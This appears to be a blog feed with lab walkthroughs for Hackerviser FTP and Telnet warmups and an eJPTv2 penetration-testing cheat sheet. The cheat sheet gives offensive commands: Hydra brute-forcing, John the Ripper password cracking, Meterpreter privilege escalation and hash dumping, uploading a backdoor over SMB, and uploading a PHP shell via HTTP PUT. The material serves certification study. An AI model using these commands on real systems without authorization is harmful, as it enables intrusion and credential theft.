<p>While FTP remains a widely used protocol for file transfer, its inherent security vulnerabilities necessitate caution, especially when handling sensitive data. Organizations should consider implementing secure alternatives like FTPS, SFTP, or SCP to safeguard their file transfer operations against potential threats. By understanding the workings of FTP and its security implications, users can make informed decisions to ensure the confidentiality, integrity, and availability of their data during file transfers.</p>
<h2 id="warmup---file-hunter---tasks"><strong>Warmup - File Hunter - Tasks</strong></h2>
<h3 id="which-ports-are-open">Which port(s) are open?</h3>
<p>Let&rsquo;s perform an <strong><code>nmap</code></strong> port scan on the target machine:</p>

    <img src="/images/hackerviser/File%20Hunter%2009e09ac895ae4346a26594893322b46f/Untitled1.png"  class="center"  style="border-radius: 10px;"  />


<p>Port 21 is open.</p>
<h3 id="what-does-ftp-stand-for">What does FTP stand for?</h3>
<p>FTP stands for File Transfer Protocol.</p>
<h3 id="what-username-did-you-connect-to-the-ftp">What username did you connect to the FTP?</h3>
<p>Simply connected with the <strong><code>anonymous</code></strong> user.</p>

    <img src="/images/hackerviser/File%20Hunter%2009e09ac895ae4346a26594893322b46f/Untitled2.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="what-command-shows-which-commands-we-can-use-on-the-ftp-server">What command shows which commands we can use on the FTP server?</h3>
<p>The <strong><code>help</code></strong> command displays all available FTP commands.

    <img src="/images/hackerviser/File%20Hunter%2009e09ac895ae4346a26594893322b46f/Untitled3.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-the-name-of-the-file-on-the-ftp-server">What is the name of the file on the FTP server?</h3>
<p>Using the <strong><code>ls</code></strong> command to list the files in the directory, we find the file named <strong><code>userlist</code></strong>.

    <img src="/images/hackerviser/File%20Hunter%2009e09ac895ae4346a26594893322b46f/Untitled4.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-the-command-we-can-use-to-download-a-file-from-an-ftp-server">What is the command we can use to download a file from an FTP server?</h3>
<p>You can use the <strong><code>get</code></strong> command to download the file:

    <img src="/images/hackerviser/File%20Hunter%2009e09ac895ae4346a26594893322b46f/Untitled5.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="which-users-information-is-in-the-file">Which users' information is in the file?</h3>
<p>Now, simply open the file to check its contents.

    <img src="/images/hackerviser/File%20Hunter%2009e09ac895ae4346a26594893322b46f/Untitled6.png"  class="center"  style="border-radius: 10px;"  />

</p>

    <img src="/images/hackerviser/File%20Hunter%2009e09ac895ae4346a26594893322b46f/Untitled7.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hackerviser Arrow - Warmup Stage I</title>
            <link>https://nmmorette.github.io/posts/2024/02/hackerviser-arrow-warmup-stage-i/</link>
            <pubDate>Mon, 26 Feb 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/02/hackerviser-arrow-warmup-stage-i/</guid>
            <description>Arrow Introduction Telnet, short for Telecommunication Network, is a protocol used for remote terminal connections, allowing users to interact with a computer or network device over a network. Despite its age and simplicity, Telnet still plays a role in various networking scenarios. However, its lack of security features makes it a risky choice in today&amp;rsquo;s cybersecurity landscape.
What is Telnet? Telnet operates on the Application Layer of the OSI model and uses a client-server architecture.</description>
            <content type="html"><![CDATA[<h1 id="arrow">Arrow</h1>

    <img src="/images/hackerviser/Arrow%20f172e2bab26f43969cf82c31f4a19955/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introduction"><strong>Introduction</strong></h2>
<p>Telnet, short for Telecommunication Network, is a protocol used for remote terminal connections, allowing users to interact with a computer or network device over a network. Despite its age and simplicity, Telnet still plays a role in various networking scenarios. However, its lack of security features makes it a risky choice in today&rsquo;s cybersecurity landscape.</p>
<h3 id="what-is-telnet">What is Telnet?</h3>
<p>Telnet operates on the Application Layer of the OSI model and uses a client-server architecture. It allows a user to establish a terminal session on a remote host, enabling them to execute commands as if they were directly connected to the system&rsquo;s console.</p>
<h3 id="how-does-telnet-work">How Does Telnet Work?</h3>
<p>Telnet works by establishing a TCP connection between a client and a server. Once the connection is established, the client sends commands and keystrokes to the server, which executes them and returns the results to the client. Telnet sessions typically operate on port 23, though this can be configured.</p>
<h3 id="security-risks-associated-with-telnet">Security Risks Associated with Telnet:</h3>
<ol>
<li>Lack of Encryption: Telnet transmits data, including usernames, passwords, and commands, in plain text. This makes it susceptible to eavesdropping and interception by malicious actors.</li>
<li>Authentication Vulnerabilities: Telnet authentication mechanisms are often weak or nonexistent, leading to the risk of unauthorized access. Default credentials are commonly used, further exacerbating this issue.</li>
<li>Session Hijacking: Since Telnet sessions lack encryption, attackers can potentially hijack active sessions, allowing them to manipulate or observe the ongoing communication between the client and server.</li>
<li>Man-in-the-Middle Attacks: Telnet sessions are vulnerable to man-in-the-middle (MITM) attacks, where an attacker intercepts and modifies the communication between the client and server, leading to data manipulation or theft.</li>
</ol>
<h3 id="alternatives-to-telnet">Alternatives to Telnet:</h3>
<ol>
<li>SSH (Secure Shell): SSH provides encrypted communication sessions over a network and offers strong authentication mechanisms, making it a more secure alternative to Telnet.</li>
<li>Remote Desktop Protocol (RDP): RDP allows users to remotely access and control Windows-based systems, offering features like encryption and multi-factor authentication.</li>
<li>Web-based Interfaces: Many network devices and servers provide web-based interfaces for remote management, offering secure communication over HTTPS.</li>
</ol>
<h3 id="conclusion">Conclusion</h3>
<p>While Telnet once served as a fundamental tool for remote terminal access, its inherent security vulnerabilities make it unsuitable for modern network environments. Organizations should transition to more secure alternatives like SSH and implement best practices to mitigate the risks associated with remote access protocols. By understanding the functionality and security risks of Telnet, network administrators can make informed decisions to safeguard their systems and data.</p>
<h2 id="warmup---arrow---tasks"><strong>Warmup - Arrow - Tasks</strong></h2>
<h3 id="which-ports-are-open">Which port(s) are open?</h3>
<p>Let’s start running <code>nmap</code> to find the open ports:

    <img src="/images/hackerviser/Arrow%20f172e2bab26f43969cf82c31f4a19955/Untitled1.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-the-running-service-name">What is the running service name?</h3>
<p>Now let’s improve or scan to get more info:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sS -A 172.20.6.209 -p <span style="color:#ae81ff">23</span>

</code></pre></div>
    <img src="/images/hackerviser/Arrow%20f172e2bab26f43969cf82c31f4a19955/Untitled2.png"  class="center"  style="border-radius: 10px;"  />


<p>Now we found the service running on port 23 is telnet.</p>
<h3 id="whats-the-usernamepassword-you-use-to-connect-to-telnet">What&rsquo;s the username:password you use to connect to telnet?</h3>
<p>First, attempt to establish a direct connection using Telnet:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnet 172.20.6.209
</code></pre></div>
    <img src="/images/hackerviser/Arrow%20f172e2bab26f43969cf82c31f4a19955/Untitled3.png"  class="center"  style="border-radius: 10px;"  />


<p>After attempting to establish a Telnet connection, it&rsquo;s possible to observe a hint suggesting the use of default credentials.

    <img src="/images/hackerviser/Arrow%20f172e2bab26f43969cf82c31f4a19955/Untitled4.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-the-working-directory-location-when-you-connect-to-telnet">What is the working directory location when you connect to telnet?</h3>
<p>In Linux system to find the folder you are in just type <code>pwd</code></p>

    <img src="/images/hackerviser/Arrow%20f172e2bab26f43969cf82c31f4a19955/Untitled5.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/hackerviser/Arrow%20f172e2bab26f43969cf82c31f4a19955/Untitled6.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>eJPTv2 - Cheat Sheet</title>
            <link>https://nmmorette.github.io/posts/2023/12/ejptv2-cheat-sheet/</link>
            <pubDate>Sun, 10 Dec 2023 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2023/12/ejptv2-cheat-sheet/</guid>
            <description>eJPTv2 Cheat Sheet Disclaimer  This is merely a suggestion based on the tools I personally found useful during the test. I encourage you to take your own notes and tailor your preparation to best suit your needs for the exam
 For additional details about the Exam, please refer to my exam Review post:
Recommended Tools  Nmap Dirbuster nikto WPSCan CrackMapExec The Metasploit Framework SearchSploit Hydra  1. Assessment Methodologies  Ping Sweep fping -a -g 10.</description>
            <content type="html"><![CDATA[<h1 id="ejptv2-cheat-sheet">eJPTv2 Cheat Sheet</h1>

    <img src="/images/ejptv2-review/cheatsheet.jpg"  class="center"  style="border-radius: 10px;"  />


<h1 id="disclaimer">Disclaimer</h1>
<blockquote>
<p>This is merely a suggestion based on the tools I personally found useful during the test. I encourage you to take your own notes and tailor your preparation to best suit your needs for the exam</p>
</blockquote>
<p>For additional details about the Exam, please refer to my exam Review post:</p>
<h2 id="recommended-tools">Recommended Tools</h2>
<ul>
<li>Nmap</li>
<li>Dirbuster</li>
<li>nikto</li>
<li>WPSCan</li>
<li>CrackMapExec</li>
<li>The Metasploit Framework</li>
<li>SearchSploit</li>
<li>Hydra</li>
</ul>
<h2 id="1-assessment-methodologies"><strong>1. Assessment Methodologies</strong></h2>
<hr>
<h3 id="ping-sweep">Ping Sweep</h3>
<pre tabindex="0"><code>fping -a -g 10.10.10.0/24 2&gt;/dev/null
nmap -sn 10.10.10.0/24
</code></pre><p>Simple Bash ping sweep:</p>
<p><a href="https://github.com/nmmorette/bash-scripts/blob/main/ping_sweep.sh" target="_blank" ></a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/bin/bash</span>
<span style="color:#75715e">###ping_sweep.sh</span>
<span style="color:#75715e">###---------------------------------------------------------------</span>
<span style="color:#75715e">### Objective: Ping all hosts in the network</span>
<span style="color:#f92672">-----------------------------------------------------</span>

<span style="color:#66d9ef">if</span> [ <span style="color:#e6db74">&#34;$1&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> ]
then
	echo <span style="color:#e6db74">&#34;PING SWEEP&#34;</span>
	echo <span style="color:#e6db74">&#34;Use mode : $0 REDE&#34;</span>
	echo <span style="color:#e6db74">&#34;Example: $0 192.168.0&#34;</span>
<span style="color:#66d9ef">else</span>
	<span style="color:#66d9ef">for</span> host <span style="color:#f92672">in</span> {<span style="color:#ae81ff">1..254</span>};
	do
		ping <span style="color:#f92672">-</span>c <span style="color:#ae81ff">1</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1.</span><span style="color:#960050;background-color:#1e0010">$</span>host <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;64 bytes&#34;</span> <span style="color:#f92672">|</span> cut <span style="color:#f92672">-</span>d <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">-</span>f <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> cut <span style="color:#f92672">-</span>d <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">-</span>f <span style="color:#ae81ff">4</span>;
	done
fi
</code></pre></div><h3 id="nmap---scans">Nmap - Scans</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>A <span style="color:#ae81ff">10.10.10.10</span> 
nmap <span style="color:#f92672">-</span>script vuln <span style="color:#f92672">-</span>p(open ports <span style="color:#f92672">from</span> the first scan)
OS Detection: nmap <span style="color:#f92672">-</span>Pn <span style="color:#f92672">-</span>O <span style="color:#ae81ff">10.10.10.10</span>
Quick Scan: nmap <span style="color:#f92672">-</span>sC <span style="color:#f92672">-</span>sV <span style="color:#ae81ff">10.10.10.10</span>
Full Scan: nmap <span style="color:#f92672">-</span>sC <span style="color:#f92672">-</span>sV <span style="color:#f92672">-</span>p<span style="color:#f92672">-</span> <span style="color:#ae81ff">10.10.10.10</span>
UDP Quick Scan: nmap <span style="color:#f92672">-</span>sU <span style="color:#f92672">-</span>sV <span style="color:#ae81ff">10.10.10.10</span>
</code></pre></div><h3 id="smb-enumeration">SMB Enumeration</h3>
<hr>
<h3 id="enum4linux">enum4linux</h3>
<pre tabindex="0"><code>enum4linux -a &lt;ip&gt;      # Enumerating using enum4linux tool
</code></pre><h3 id="smbclient">smbclient</h3>
<pre tabindex="0"><code>smbclient -L //IP -N    # Checking for available shares
smbclient //&lt;target IP&gt;/IPC$ -N     # Connecting to a share
</code></pre><h3 id="smbmap">smbmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">smbmap <span style="color:#f92672">-</span>u guest <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">-</span>d <span style="color:#f92672">.</span> <span style="color:#f92672">-</span>H <span style="color:#f92672">&lt;</span>TARGET_IP<span style="color:#f92672">&gt;</span>

smbmap <span style="color:#f92672">-</span>u <span style="color:#f92672">&lt;</span>USER<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;&lt;PW&gt;&#39;</span> <span style="color:#f92672">-</span>d <span style="color:#f92672">.</span> <span style="color:#f92672">-</span>H <span style="color:#f92672">&lt;</span>TARGET_IP<span style="color:#f92672">&gt;</span>

<span style="color:#75715e">## Run a command</span>
smbmap <span style="color:#f92672">-</span>u <span style="color:#f92672">&lt;</span>USER<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;&lt;PW&gt;&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#f92672">&lt;</span>TARGET_IP<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>x <span style="color:#e6db74">&#39;ipconfig&#39;</span>
<span style="color:#75715e">## List all drives</span>
smbmap <span style="color:#f92672">-</span>u <span style="color:#f92672">&lt;</span>USER<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;&lt;PW&gt;&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#f92672">&lt;</span>TARGET_IP<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>L
<span style="color:#75715e">## List dir content</span>
smbmap <span style="color:#f92672">-</span>u <span style="color:#f92672">&lt;</span>USER<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;&lt;PW&gt;&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#f92672">&lt;</span>TARGET_IP<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>r <span style="color:#e6db74">&#39;C$&#39;</span>
<span style="color:#75715e">## Upload a file</span>
smbmap <span style="color:#f92672">-</span>u <span style="color:#f92672">&lt;</span>USER<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;&lt;PW&gt;&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#f92672">&lt;</span>TARGET_IP<span style="color:#f92672">&gt;</span> <span style="color:#f92672">--</span>upload <span style="color:#e6db74">&#39;/root/sample_backdoor&#39;</span> <span style="color:#e6db74">&#39;C$\sample_backdoor&#39;</span>
<span style="color:#75715e">## Download a file</span>
smbmap <span style="color:#f92672">-</span>u <span style="color:#f92672">&lt;</span>USER<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;&lt;PW&gt;&#39;</span> <span style="color:#f92672">-</span>H <span style="color:#f92672">&lt;</span>TARGET_IP<span style="color:#f92672">&gt;</span> <span style="color:#f92672">--</span>download <span style="color:#e6db74">&#39;C$</span><span style="color:#ae81ff">\f</span><span style="color:#e6db74">lag.txt&#39;</span>
</code></pre></div><h3 id="metasploit">Metasploit</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># METASPLOIT SMB</span>
use auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>smb<span style="color:#f92672">/</span>smb_version
use auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>smb<span style="color:#f92672">/</span>smb_enumusers
use auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>smb<span style="color:#f92672">/</span>smb_enumshares
use auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>smb<span style="color:#f92672">/</span>smb_login
use auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>smb<span style="color:#f92672">/</span>pipe_auditor
</code></pre></div><h2 id="2-host--network-auditing"><strong>2. Host &amp; Network Auditing</strong></h2>
<hr>
<h3 id="checking-routes">Checking Routes</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ip route    <span style="color:#75715e"># Checking defined routes in linux</span>
route       <span style="color:#75715e"># Checking defined routes in linux</span>
route print     <span style="color:#75715e"># Checking defined routes in windows</span>
</code></pre></div><h3 id="adding-manual-routes">Adding Manual Routes</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ip route add <span style="color:#f92672">&lt;</span>subnet<span style="color:#f92672">&gt;</span> via <span style="color:#f92672">&lt;</span>gateway <span style="color:#f92672">or</span> router address<span style="color:#f92672">&gt;</span>
</code></pre></div><h3 id="finding-mac-addresses">Finding Mac Addresses</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ipconfig <span style="color:#f92672">/</span>all       <span style="color:#75715e"># windows</span>
ifconfig        <span style="color:#75715e"># *nix OSs</span>
ip addr     <span style="color:#75715e"># linux</span>
</code></pre></div><h3 id="checking-arp-cache">Checking ARP Cache</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">arp <span style="color:#f92672">-</span>a      <span style="color:#75715e"># Windows</span>
arp     <span style="color:#75715e"># *nix OSs</span>
ip neighbour        <span style="color:#75715e"># Linux</span>
</code></pre></div><h3 id="checking-for-listening-ports-on-a-host">Checking for Listening Ports On a Host</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#Windows</span>
netstat <span style="color:#f92672">-</span>ano      
Get<span style="color:#f92672">-</span>NetTCPConnection <span style="color:#f92672">|</span> where {<span style="color:#960050;background-color:#1e0010">$</span>_<span style="color:#f92672">.</span>State <span style="color:#f92672">-</span>eq <span style="color:#e6db74">&#39;Listen&#39;</span>} 

<span style="color:#75715e">#Linux</span>
netstat <span style="color:#f92672">-</span>tunp      
lsof <span style="color:#f92672">-</span>i <span style="color:#f92672">-</span>P <span style="color:#f92672">-</span>n <span style="color:#f92672">|</span> grep LISTEN
ss <span style="color:#f92672">-</span>tuln 
</code></pre></div><h2 id="3-host--network-penetration-testing"><strong>3. Host &amp; Network Penetration Testing</strong></h2>
<hr>
<p>Use the information from the 1 and 2  phases to find a vulnerable threat vector.</p>
<p>Below are some helpful Vulnerability assessment resources:</p>
<ul>
<li>Searchsploit</li>
<li>ExploitDB</li>
<li>Msfconsole search command</li>
<li>Google</li>
<li>Nessus</li>
</ul>
<h3 id="reverse-shell">Reverse Shell</h3>
<p>Excelente online Reverse Shell Generator</p>
<p><a href="https://www.revshells.com/" target="_blank" >Online - Reverse Shell Generator</a></p>
<h3 id="enconde-decode">Enconde-Decode</h3>
<p><a href="https://gchq.github.io/CyberChef/" target="_blank" >CyberChef</a></p>
<h3 id="metasploit-basic-commands">Metasploit Basic Commands</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">search x
use x
info
show options, show advanced options
SET X (e<span style="color:#f92672">.</span>g<span style="color:#f92672">.</span> set RHOST <span style="color:#ae81ff">10.10.10.10</span>, set payload x)
</code></pre></div><h3 id="meterpreter">Meterpreter</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#Autoroute</span>
meterpreter<span style="color:#f92672">&gt;</span> run autoroute <span style="color:#f92672">-</span>s <span style="color:#f92672">&lt;</span>subnet<span style="color:#f92672">&gt;</span>
meterpreter <span style="color:#f92672">&gt;</span> run autoroute <span style="color:#f92672">-</span>p      <span style="color:#75715e"># show active route table</span>

<span style="color:#75715e">#Basic Commands</span>

background
sessions <span style="color:#f92672">-</span>l
sessions <span style="color:#f92672">-</span>i <span style="color:#ae81ff">1</span>
sysinfo, ifconfig, route, getuid
getsystem (privesc)
bypassuac
download x <span style="color:#f92672">/</span>root<span style="color:#f92672">/</span>
upload x C:\\Windows
shell
use post<span style="color:#f92672">/</span>windows<span style="color:#f92672">/</span>gather<span style="color:#f92672">/</span>hashdump
</code></pre></div><h3 id="hydra">Hydra</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">hydra <span style="color:#f92672">-</span>U ftp        <span style="color:#75715e"># hydra uses module for each service to attack. To get information about a module this command can be used</span>
hydra <span style="color:#f92672">-</span>L users<span style="color:#f92672">.</span>txt <span style="color:#f92672">-</span>P <span style="color:#66d9ef">pass</span><span style="color:#f92672">.</span>txt <span style="color:#f92672">&lt;</span>service:<span style="color:#f92672">//</span>server<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span>options<span style="color:#f92672">&gt;</span>
hydra <span style="color:#f92672">-</span>l admin <span style="color:#f92672">-</span>P <span style="color:#66d9ef">pass</span><span style="color:#f92672">.</span>txt <span style="color:#f92672">-</span>f ftp:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10.10.10</span>        <span style="color:#75715e"># Stop attacking on finding first successful hit for user admin</span>
hydra  <span style="color:#f92672">-</span>L users<span style="color:#f92672">.</span>txt <span style="color:#f92672">-</span>P passwords<span style="color:#f92672">.</span>txt <span style="color:#f92672">&lt;</span>IP<span style="color:#f92672">&gt;</span> http<span style="color:#f92672">-</span>post<span style="color:#f92672">-</span>form <span style="color:#e6db74">&#34;/login.php:user=^USER^&amp;pass=^PASS^:Incorrect credentials&#34;</span> <span style="color:#f92672">-</span>f <span style="color:#f92672">-</span>V    <span style="color:#75715e"># Attacking http post form</span>
</code></pre></div><h3 id="john-the-ripper">John-The-Ripper</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">john <span style="color:#f92672">--</span>list<span style="color:#f92672">=</span>formats
john <span style="color:#f92672">-</span>incremental <span style="color:#f92672">-</span>users:<span style="color:#f92672">&lt;</span>users list<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span>file to crack<span style="color:#f92672">&gt;</span>       <span style="color:#75715e"># if you want to crack only certain users from the password database such as /etc/shadow file</span>
john <span style="color:#f92672">--</span>show crackme     <span style="color:#75715e"># Check cracked password after completion of cracking session, where crackme is the password database file</span>
john <span style="color:#f92672">-</span>wordlist<span style="color:#f92672">=&lt;</span>wordlist<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span>file to crack<span style="color:#f92672">&gt;</span>
john <span style="color:#f92672">-</span>wordlist<span style="color:#f92672">=&lt;</span>wordlist<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>rules <span style="color:#f92672">&lt;</span>file to crack<span style="color:#f92672">&gt;</span>        <span style="color:#75715e"># rules are used for cracking mangling words such as for cat mangling words could be c@t,caT,CAT,CaT</span>
</code></pre></div><h2 id="4-web-application-penetration-testing"><strong>4. Web Application Penetration Testing</strong></h2>
<h3 id="information-gathering">Information Gathering</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">wappanalyzer
whatweb
nikto <span style="color:#f92672">-</span>h
whatweb <span style="color:#f92672">&lt;</span>HOST<span style="color:#f92672">&gt;</span>
whois <span style="color:#f92672">&lt;</span>HOST<span style="color:#f92672">&gt;</span>
whois <span style="color:#f92672">&lt;</span>IP<span style="color:#f92672">&gt;</span>
dnsrecon <span style="color:#f92672">-</span>d <span style="color:#f92672">&lt;</span>HOST<span style="color:#f92672">&gt;</span>
</code></pre></div><h3 id="banner-grabbing">Banner Grabbing</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">**</span>nc <span style="color:#f92672">-</span>v <span style="color:#ae81ff">10.10.10.10</span> port<span style="color:#f92672">**</span>
<span style="color:#f92672">**</span>HEAD <span style="color:#f92672">/</span> HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span><span style="color:#f92672">**</span>
</code></pre></div><h3 id="openssl-for-https-services">OpenSSL for HTTPS services</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">**</span>openssl s_client <span style="color:#f92672">-</span>connect <span style="color:#ae81ff">10.10.10.10</span>:<span style="color:#ae81ff">443</span><span style="color:#f92672">**</span>, <span style="color:#f92672">**</span>HEAD <span style="color:#f92672">/</span> HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span><span style="color:#f92672">**</span>
</code></pre></div><h3 id="httprint">Httprint</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">**</span>httprint <span style="color:#f92672">-</span>P0 <span style="color:#f92672">-</span>h <span style="color:#ae81ff">10.10.10.10</span> <span style="color:#f92672">-</span>s <span style="color:#f92672">/</span>path<span style="color:#f92672">/</span>to<span style="color:#f92672">/</span>signaturefile<span style="color:#f92672">.</span>txt<span style="color:#f92672">**</span>
</code></pre></div><h3 id="http-verbs">HTTP Verbs</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">GET, POST, HEAD, PUT, DELETE, OPTIONS

</code></pre></div><p>Use the OPTIONS to check if other verbs are available:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">nc <span style="color:#ae81ff">10.10.10.10</span> <span style="color:#ae81ff">80</span>
OPTIONS <span style="color:#f92672">/</span> HTPP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span>
</code></pre></div><p>To upload a PHP shell, HTTP verbs can be utilized. First, determine the content length, then employ the PUT method for uploading the shell. It&rsquo;s essential to include the payload size in the PUT command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">wc <span style="color:#f92672">-</span>m shell<span style="color:#f92672">.</span>php
x shell<span style="color:#f92672">.</span>php

PUT <span style="color:#f92672">/</span>shell<span style="color:#f92672">.</span>php
Content<span style="color:#f92672">-</span>type: text<span style="color:#f92672">/</span>html
Content<span style="color:#f92672">-</span>length: y
</code></pre></div><h3 id="directory-and-file-scanning">Directory and File Scanning</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">**</span>dirsearch<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10.10.10</span> <span style="color:#f92672">-</span>e <span style="color:#f92672">***</span>
<span style="color:#f92672">**</span>gobuster <span style="color:#f92672">-</span>u <span style="color:#ae81ff">10.10.10.10</span> <span style="color:#f92672">-</span>w <span style="color:#f92672">/</span>path<span style="color:#f92672">/</span>to<span style="color:#f92672">/</span>wordlist<span style="color:#f92672">.</span>txt
ffuf<span style="color:#f92672">**</span> <span style="color:#f92672">-</span>w <span style="color:#f92672">**/</span>path<span style="color:#f92672">/</span>to<span style="color:#f92672">/</span>wordlist<span style="color:#f92672">.</span>txt<span style="color:#f92672">**</span>:FUZZ <span style="color:#f92672">-</span>u http:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>evil<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>FUZZ
dirb http:<span style="color:#f92672">//&lt;</span>IP<span style="color:#f92672">&gt;/</span>
<span style="color:#f92672">**</span>dirbyster<span style="color:#f92672">&amp;**</span> 

</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Review eJPTv2 - Junior Penetration Tester</title>
            <link>https://nmmorette.github.io/posts/2023/12/review-ejptv2-junior-penetration-tester/</link>
            <pubDate>Sun, 10 Dec 2023 00:00:00 +0000</pubDate>
            
